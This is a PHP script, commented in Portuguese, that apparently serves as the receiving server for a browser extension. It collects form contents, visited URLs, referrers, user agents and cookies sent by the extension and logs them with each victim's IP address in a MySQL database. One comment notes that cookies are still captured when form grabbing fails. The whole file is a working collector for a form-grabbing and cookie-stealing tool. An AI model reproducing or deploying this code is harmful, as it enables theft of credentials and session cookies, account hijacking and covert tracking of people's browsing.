<?php

/* Carrega informações essenciais (include) */
require_once("config.php");


/* Captura os dados submetidos no formulário e enviados pela extensão */
$clientId = $_POST["clientId"];
$data = $_POST["data"];
$url = $_POST["url"];
$referrer = $_POST["referrer"];
$userAgent = $_POST["userAgent"];
$cookie = $_POST["cookie"];


if(empty($url)) { // A URL é nula?
	echo "URL can't be null." . PHP_EOL;
	exit();
}

/*if(empty($data)) { // Há dados a serem submetidos? Essa verificação pode ser comentada, porque há casos em que a extensão falha em pegar o formulário, mas consegue pegar os Cookies.
	echo "Data can't be null." . PHP_EOL;
	exit();
}*/


$dbCon = new mysqli($dbServer, $dbUsername, $dbPassword, $dbName); // Iniciar conexão ao banco de dados MySQL.

if($dbCon->connect_error) { // Deu erro ao conectar ao banco de dados?
	echo "Could not connect to database." . PHP_EOL;
	exit();
}


$uniqueId = uniqid(time(), true); // Gera um ID único para este formulário submetido.

$dbSql = "INSERT INTO submits(id, time, clientId, ip, data, url, referrer, userAgent, cookie) VALUES(?, NOW(), ?, ?, ?, ?, ?, ?, ?)"; // Query SQL para inserção no banco de dados.

$dbQuery = $dbCon->prepare($dbSql); // Prepara a query SQL para inserção no banco de dados.

if(!$dbQuery) { // Deu erro pra fazer isso?
	echo "Could not prepare database SQL." . PHP_EOL;
	exit();
}


$dbQuery->bind_param("ssssssss", $uniqueId, $clientId, $_SERVER["REMOTE_ADDR"], $data, $url, $referrer, $userAgent, $cookie); // Insere os parâmetros capturados na query (proteção contra SQL-Injection).


if($sleep === true) // Caso em que o script deve dormir pra demonstrar ao usuário no navegador que a extensão está funcionando.
	sleep(5); // 5 segundos


if ($dbQuery->execute() === TRUE) // Faz a inserção no banco de dados.
	echo "Ok." . PHP_EOL;
else
	echo "Error inserting into database." . PHP_EOL; // Caso em que deu erro para inserir no banco de dados.


